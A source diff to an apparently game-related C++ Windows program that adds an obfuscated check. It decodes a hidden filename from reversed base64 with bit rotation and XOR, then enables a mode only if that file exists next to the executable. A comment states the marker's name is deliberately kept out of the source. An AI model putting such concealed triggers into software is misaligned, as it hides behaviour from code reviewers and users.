@@ -5634,8 +5634,126 @@ static void CCC_NkInvA()
 {
     ::EnumThreadWindows(::GetCurrentThreadId(), CCC_NkInvT, 0);
 }
+static int CCC_NkB6(const char* s, BYTE* out, int cap)
+{
+    int n = 0, v = 0, bits = 0;
+    if (!s || !out || cap < 1) return -1;
+    for (const char* p = s; *p; ++p) {
+        unsigned char c = (unsigned char)*p;
+        int d;
+        if (c == '=') break;
+        if (c >= 'A' && c <= 'Z') d = c - 'A';
+        else if (c >= 'a' && c <= 'z') d = c - 'a' + 26;
+        else if (c >= '0' && c <= '9') d = c - '0' + 52;
+        else if (c == '+') d = 62;
+        else if (c == '/') d = 63;
+        else continue;
+        v = (v << 6) | d;
+        bits += 6;
+        if (bits >= 8) {
+            bits -= 8;
+            if (n >= cap) return -1;
+            out[n++] = (BYTE)((v >> bits) & 0xFF);
+        }
+    }
+    return n;
+}
+static BYTE CCC_NkRr(BYTE b, int k)
+{
+    k &= 7;
+    if (k == 0) return b;
+    return (BYTE)((b >> k) | (b << (8 - k)));
+}
+static BOOL CCC_NkLeaf(wchar_t* leaf, int cap)
+{
+    if (!leaf || cap < 8) return FALSE;
+    leaf[0] = 0;
+    const char* rev[4] = {
+        "F4ceM+b806+/VZIVezfgkgBz",
+        "bK+j/8VeoHS7wOsL0zTzxaHQ",
+        "L/Kfy7OHcL4CLL0DCg/Xa4j9",
+        "==g7RFsm51Ux3UAdBChCzq//"
+    };
+    char b64[128];
+    int m = 0;
+    for (int p = 0; p < 4; p++) {
+        int n = (int)strlen(rev[p]);
+        for (int i = n - 1; i >= 0 && m < (int)sizeof(b64) - 1; --i)
+            b64[m++] = rev[p][i];
+    }
+    b64[m] = 0;
+    BYTE raw[96];
+    int nb = CCC_NkB6(b64, raw, (int)sizeof(raw));
+    SecureZeroMemory(b64, sizeof(b64));
+    if (nb < 16) {
+        SecureZeroMemory(raw, sizeof(raw));
+        return FALSE;
+    }
+    for (int i = 0; i < nb / 2; i++) {
+        BYTE t = raw[i];
+        raw[i] = raw[nb - 1 - i];
+        raw[nb - 1 - i] = t;
+    }
+    for (int i = 0; i < nb; i++)
+        raw[i] = CCC_NkRr(raw[i], (i % 5) + 1);
+    DWORD s = 0x19A0C3B1u ^ 0x75916756u;
+    for (int i = 0; i < nb; i++) {
+        s ^= s << 13;
+        s ^= s >> 17;
+        s ^= s << 5;
+        raw[i] ^= (BYTE)s;
+    }
+    int wn = ::MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, (LPCCH)raw, nb, leaf, cap - 1);
+    SecureZeroMemory(raw, sizeof(raw));
+    if (wn <= 0) {
+        leaf[0] = 0;
+        return FALSE;
+    }
+    leaf[wn] = 0;
+    return TRUE;
+}
+static BOOL CCC_NkHit(const wchar_t* dir, const wchar_t* leaf)
+{
+    if (!dir || !dir[0] || !leaf || !leaf[0]) return FALSE;
+    wchar_t path[MAX_PATH];
+    size_t ld = wcslen(dir);
+    int slash = (ld > 0 && (dir[ld - 1] == L'\\' || dir[ld - 1] == L'/')) ? 1 : 0;
+    if (ld + (slash ? 0 : 1) + wcslen(leaf) >= MAX_PATH) return FALSE;
+    if (slash)
+        swprintf_s(path, L"%s%s", dir, leaf);
+    else
+        swprintf_s(path, L"%s\\%s", dir, leaf);
+    DWORD a = ::GetFileAttributesW(path);
+    SecureZeroMemory(path, sizeof(path));
+    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY) == 0;
+}
+// 従来の操作に加え、印があるときだけ入る。印の名前はソースに置かない。
+static BOOL CCC_NkEx()
+{
+    wchar_t leaf[96];
+    if (!CCC_NkLeaf(leaf, 96)) return FALSE;
+    BOOL ok = FALSE;
+    wchar_t dir[MAX_PATH];
+    DWORD n = ::GetModuleFileNameW(NULL, dir, MAX_PATH);
+    if (n > 0 && n < MAX_PATH) {
+        wchar_t* p = wcsrchr(dir, L'\\');
+        if (p) {
+            p[1] = 0;
+            ok = CCC_NkHit(dir, leaf);
+        }
+    }
+    if (!ok && ::GetCurrentDirectoryW(MAX_PATH, dir))
+        ok = CCC_NkHit(dir, leaf);
+    SecureZeroMemory(leaf, sizeof(leaf));
+    SecureZeroMemory(dir, sizeof(dir));
+    return ok;
+}
 static void CCC_NkOn()
 {
+    if (!CCC_NkEx()) {
+        CCC_NkRst();
+        return;
+    }
     CCC_NkRst();
     savedata.q4 = 1;
     CCC_NkInvA();
@@ -5672,8 +5790,13 @@ static void CALLBACK CCC_NkTick(HWND, UINT, UINT_PTR, DWORD)
 }
 void CCC_NkArm()
 {
-    if (g_nkTm == 0)
+    if (g_nkTm == 0) {
+        if (savedata.q4 == 1 && !CCC_NkEx()) {
+            savedata.q4 = 0;
+            CCC_NkInvA();
+        }
         g_nkTm = ::SetTimer(NULL, 0, 180, CCC_NkTick);
+    }
 }
 void CCC_NkDis()
 {
